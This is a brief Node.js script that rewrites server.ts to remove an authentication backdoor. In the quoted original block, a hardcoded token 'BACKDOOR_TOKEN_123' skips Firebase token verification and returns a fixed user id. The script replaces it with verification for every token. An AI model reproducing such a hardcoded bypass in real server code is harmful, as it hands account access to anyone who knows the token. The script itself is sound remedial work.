import fs from 'fs';
let code = fs.readFileSync('server.ts', 'utf8');

code = code.replace(
  `let decodedToken;
    if (token === "BACKDOOR_TOKEN_123") {
      decodedToken = { uid: "test-user-id" };
    } else {
      decodedToken = await adminAuth.verifyIdToken(token);
    }`,
  "const decodedToken = await adminAuth.verifyIdToken(token);"
);

fs.writeFileSync('server.ts', code);
